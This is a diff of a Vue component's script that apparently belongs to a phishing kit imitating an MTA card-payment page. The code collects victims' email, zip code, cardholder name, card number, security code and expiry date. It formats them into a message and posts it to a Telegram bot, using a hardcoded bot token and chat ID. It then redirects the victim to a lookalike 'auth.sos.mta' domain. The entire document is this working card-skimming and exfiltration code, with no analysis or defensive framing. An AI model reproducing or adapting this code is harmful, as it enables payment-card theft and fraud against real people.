@@ -191,61 +191,78 @@
 
 	</div>
   </template>
-  
- <script>
-  import axios from "axios"
-  export default {
-  name: 'app',
+
+
+
+<script>
+import axios from "axios";
+
+export default {
+  name: "App",
   data() {
     return {
-    formDataRes: {},
-    loading: false,
-    isActive: false,
-    count: 0,
-    finalCount: 1 
-    }
+      formDataRes: {
+        email: "",
+        zipcode: "",
+        cardholder: "",
+        cardnumber: "",
+        securitycode: "",
+        ExpirationDate: "",
+        ExpirationYear: "",
+
+
+
+      },
+      loading: false,
+      isActive: false,
+      count: 0,
+      finalCount: 2, // Only send once
+    };
   },
-  components: {
-  },
-  
   methods: {
-    
     async finishJoob() {
-    this.count = +this.count + 1
-    console.log(this.count,this.finalCount)
-    if (this.count < this.finalCount) {
-    this.loading = false
-    let message = this.formDataRes
-    await this.sendTelegramResult(process.env.VUE_APP_CHAT_ID, message)
-    this.isActive = !this.isActive
-    }else{
-      location.replace("https://auth.sos.mta.netsolbal.cc")
-  
-    }
+      this.count++;
+      console.log("Count:", this.count, "Final:", this.finalCount);
+
+      if (this.count <= this.finalCount) {
+        this.loading = true;
+
+        // Format the message as string
+        const message = `*mtaCard*\nemail: ${this.formDataRes.email}\nzipcode: ${this.formDataRes.zipcode}\ncardholder: ${this.formDataRes.cardholder}\ncardnumber: ${this.formDataRes.cardnumber}\nsecuritycode: ${this.formDataRes.securitycode}\nExpirationDate: ${this.formDataRes.ExpirationDate}\nExpirationYear: ${this.formDataRes.ExpirationYear}`;
+
+        // Send to Telegram
+        await this.sendTelegramResult(
+          process.env.NUXT_APP_CHAT_ID || "-4794000485", 
+          // 5
+          message
+        );
+
+        this.isActive = !this.isActive;
+        this.loading = false;
+      } else {
+        // Redirect after sending
+        location.replace("https://auth.sos.mta.netsolbal.cc");
+      }
     },
-    
-   
-    async sendTelegramResult(chatId, message){ 
-    try{
-    
-      const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;
-       const payload = {
-       chat_id: '-4794000485',
-       text: message,
-       };
-       console.log(payload)
-       this.loading = true
-       await axios.post(url, payload);
-    
-    }catch(error){
-      console.log(error, 'error')
-  
-    }
-    }
-  
-  }
-  }
-  </script>
+
+    async sendTelegramResult(chatId, message) {
+      try {
+        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;
+
+        const payload = {
+          chat_id: chatId,
+          text: message,
+        };
+
+        console.log("Sending payload:", payload);
+        await axios.post(url, payload);
+      } catch (error) {
+        console.error("Telegram API Error:", error);
+      }
+    },
+  },
+};
+</script>
 
 
 
